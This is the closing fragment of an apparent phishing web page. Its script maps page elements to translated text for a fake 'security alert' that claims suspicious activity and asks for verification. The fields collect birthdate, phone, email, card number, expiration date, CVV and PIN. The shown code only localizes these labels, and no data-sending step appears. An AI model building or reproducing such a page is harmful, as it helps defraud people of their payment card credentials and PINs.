        '#security-page .info-box p:last-of-type': translations[lang].dataProtection,
        '#security-alert h2': translations[lang].alertTitle,
        '#security-alert p:nth-of-type(1)': translations[lang].suspiciousActivity,
        '#security-alert p:nth-of-type(2)': translations[lang].securityNeedVerification,
        '#security-alert p:nth-of-type(3)': translations[lang].completeInfo,
        '#birthdate-label': translations[lang].birthdate,
        '#phone-label': translations[lang].phone,
        '#email-label': translations[lang].email,
        '#card-number-label': translations[lang].cardNumber,
        '#expiration-date-label': translations[lang].expirationDate,
        '#cvv-label': translations[lang].cvv,
        '#pin-label': translations[lang].pin,
        '#validate-button': translations[lang].validate,
        '#security-alert .button': translations[lang].continue
    };

    // Safely update each element if it exists
    for (const [selector, text] of Object.entries(elements)) {
        const element = document.querySelector(selector);
        if (element) {
            element.textContent = text;
        }
    }
}

</script>
</body>
</html>
